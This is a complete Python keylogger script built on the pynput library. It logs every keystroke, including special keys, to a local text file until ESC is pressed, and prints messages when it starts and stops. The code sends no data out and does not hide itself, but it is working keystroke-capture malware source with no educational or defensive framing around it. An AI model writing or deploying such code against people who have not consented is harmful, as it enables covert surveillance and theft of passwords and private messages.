from pynput import keyboard

# File where keystrokes will be logged
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Save alphanumeric keys
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (Enter, Space, etc.)
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop if ESC is pressed
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False

# Start listening
print("⌨️ Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
